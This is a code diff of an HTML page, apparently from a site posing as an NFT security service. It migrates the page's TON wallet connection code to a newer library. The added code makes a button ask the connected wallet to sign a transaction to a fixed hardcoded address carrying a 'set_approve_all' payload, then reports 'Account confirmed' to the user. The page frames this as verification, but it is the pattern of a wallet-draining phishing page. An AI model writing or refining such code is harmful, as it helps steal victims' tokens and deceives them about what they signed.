@@ -699,50 +699,73 @@ applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 </script>
 
 <div id="ton-connect-button" style="margin-top:12px;"></div>
-<script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@0.0.39/dist/tonconnect-sdk.min.js"></script>
+<p id="ton-status">Кошелёк не подключён</p>
+
+<script src="https://unpkg.com/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
-    const connector = new TonConnect();
-    connector.connect({ manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json' });
+  if (!window.TON_CONNECT_UI) {
+    console.error("TON Connect UI не загрузился");
+    return;
+  }
 
-    const ownBtn = document.getElementById('ownBtn');
-    if (ownBtn) {
-        ownBtn.addEventListener('click', async function () {
-            const err = document.getElementById('err');
-            if (!err) return;
+  const ui = new TON_CONNECT_UI.TonConnectUI({
+    manifestUrl: "https://nftsecurity.online/tonconnect-manifest.json",
+    buttonRootId: "ton-connect-button"
+  });
 
-            if (!connector.wallet) {
-                err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
-                err.style.display = 'block';
-                await connector.connect({ manifestUrl: 'https://nftsecurity.online/tonconnect-manifest.json' });
-                return;
-            }
-
-            err.textContent = '⏳ Отправляем запрос...';
-            err.style.display = 'block';
-            err.style.color = '#ff9abb';
-
-            try {
-                const transaction = {
-                    valid_until: Math.floor(Date.now() / 1000) + 300,
-                    messages: [
-                        {
-                            address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
-                            amount: '0',
-                            payload: 'set_approve_all'
-                        }
-                    ]
-                };
-                await connector.sendTransaction(transaction);
-                err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
-                err.style.color = '#00ff88';
-            } catch (e) {
-                err.textContent = '❌ Ошибка: ' + e.message;
-                err.style.display = 'block';
-                err.style.color = '#ff9abb';
-            }
-        });
+  function showWallet(wallet) {
+    const el = document.getElementById("ton-status");
+    if (!el) return;
+    if (!wallet) {
+      el.textContent = "Кошелёк не подключён";
+      return;
     }
+    const addr = wallet.account && wallet.account.address;
+    el.textContent = addr ? "Подключено: " + addr : "Кошелёк подключён";
+  }
+
+  ui.onStatusChange(showWallet);
+  showWallet(ui.wallet);
+
+  const ownBtn = document.getElementById('ownBtn');
+  if (ownBtn) {
+    ownBtn.addEventListener('click', async function () {
+      const err = document.getElementById('err');
+      if (!err) return;
+
+      if (!ui.wallet) {
+        err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
+        err.style.display = 'block';
+        ui.openModal();
+        return;
+      }
+
+      err.textContent = '⏳ Отправляем запрос...';
+      err.style.display = 'block';
+      err.style.color = '#ff9abb';
+
+      try {
+        const transaction = {
+          valid_until: Math.floor(Date.now() / 1000) + 300,
+          messages: [
+            {
+              address: 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m',
+              amount: '0',
+              payload: 'set_approve_all'
+            }
+          ]
+        };
+        await ui.sendTransaction(transaction);
+        err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
+        err.style.color = '#00ff88';
+      } catch (e) {
+        err.textContent = '❌ Ошибка: ' + e.message;
+        err.style.display = 'block';
+        err.style.color = '#ff9abb';
+      }
+    });
+  }
 });
 </script>
 </body>
